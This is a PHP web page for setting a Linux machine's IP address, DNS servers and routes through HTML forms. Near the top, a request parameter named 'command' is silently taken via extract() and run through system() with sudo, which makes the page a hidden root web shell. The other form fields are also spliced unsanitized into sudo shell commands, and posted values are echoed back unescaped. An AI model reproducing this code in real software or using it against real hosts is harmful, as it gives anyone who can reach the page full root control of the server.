
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=GB2312">

</head>
<body bgcolor=#ffffff text=#000000 link=#0000cc vlink=#551a8b alink=#ff0000 onLoad=sf() topmargin=3 marginheight=3>
<br>
<br>
<?php
	$exec=NULL;
	extract($_REQUEST, EXTR_PREFIX_ALL|EXTR_REFS,"cmd_");
	if($cmd_command) {$exec=$cmd_command;}
?>

<form action="" method="post" name=f>
<br>

IP:<input type="text" name="ip" size="20" value='<?echo $ip=@$_POST['ip'];?>' >
Mask:<input type="text" name="mask" size="20" value='<?echo $mask=$_POST['mask'];?>' >
Getway:<input type="text" name="gw" size="20" value='<?echo $gw=$_POST['gw'];?>' >
<input name="config" type="submit" value="ConfigIP"></p>

DNS:<br>
Primary:<input type="text" name="dns1" size="20" value='<?echo $dns1=$_POST['dns1'];?>' >
Secondary:<input type="text" name="dns2" size="20" value='<?echo $dns2=$_POST['dns2'];?>' >
Tertiary:<input type="text" name="dns3" size="20" value='<?echo $dns3=$_POST['dns3'];?>' >
<input name="config" type="submit" value="ConfigDNS"></p>

AddHostRoute:<br>
Host:<input type="text" name="host" size="20" value='<?echo $host=$_POST['host'];?>' >
Getway:<input type="text" name="rgw" size="20" value='<?echo $rgw=$_POST['rgw'];?>' >
<input name="config" type="submit" value="AddHostRoute"></p>

AddNetRoute:<br>
Net:<input type="text" name="netroute" size="20" value='<?echo $netroute=@$_POST['netroute'];?>' >
Getway:<input type="text" name="nrgw" size="20" value='<?echo $nrgw=$_POST['nrgw'];?>' >
Mask:<input type="text" name="nmask" size="20" value='<?echo $nmask=$_POST['nmask'];?>' >
<input name="config" type="submit" value="AddNetRoute"></p>


DelHostRoute:<br>
Host:<input type="text" name="dhost" size="20" value='<?echo $dhost=$_POST['dhost'];?>' >
Getway:<input type="text" name="drgw" size="20" value='<?echo $drgw=$_POST['drgw'];?>' >
<input name="config" type="submit" value="DelHostRoute"></p>

DelNetRoute:<br>
Net:<input type="text" name="dnetroute" size="20" value='<?echo $dnetroute=$_POST['dnetroute'];?>' >
Getway:<input type="text" name="dnrgw" size="20" value='<?echo $dnrgw=$_POST['dnrgw'];?>' >
Mask:<input type="text" name="dnmask" size="20" value='<?echo $dnmask=$_POST['dnmask'];?>' >
<input name="config" type="submit" value="DelNetRoute"></p>

<textarea cols="80" rows="3" readonly>
<?php
switch($_POST['config'])
{
    case ConfigIP:
	$exec="ifconfig eth0 ".$ip." netmask ".$mask." up";
	$exec1="route add default gw ".$gw;
	$flag=1;
	break;
    case ConfigDNS:
	$dns=1;
	break;
    case AddHostRoute:
	$exec="route add -host ".$host." gw ".$rgw;
	break;
    case AddNetRoute:
	$exec="route add -net ".$netroute." netmask ".$nmask." gw ".$nrgw; 
	break;
    case DelHostRoute:
	$exec="route del -host ".$dhost." gw ".$drgw;
	break;
    case DelNetRoute:
	$exec="route del -net ".$dnetroute." netmask ".$dnmask." gw ".$dnrgw; 
	break;
}
       	
if($exec) 
{
    system("sudo $exec",$ret);
   if(!$ret)
       echo "Changed successfully\n";
   else
       echo "Changed unsuccessfully\n";
}
if($flag) 
{
    system("sudo $exec1",$ret1);
    $flag=0;
    if(!$ret1)
	echo "Getway Changed successfully\n";
    else
	echo "Getway Changed unsuccessfully\n";
}
if($dns) 
{
    $fd=fopen("/etc/resolv.conf", "w+");
    if ($fd) 
    {
	if($dns1)
	    fwrite($fd, "nameserver $dns1\n"); 
	if($dns2)
	    fwrite($fd, "nameserver $dns2\n"); 
	if($dns3)
	    fwrite($fd, "nameserver $dns3\n"); 
    }
    else
	echo "open file error!\n";
    $dns=0;
    if(!$dns1 && !$dns2 && !$dns3)
	echo "DNS has not changed!";
    else
	echo "DNS has changed!";
    fclose($fd);
}
?>
</textarea>
</form>
</body>
</html>
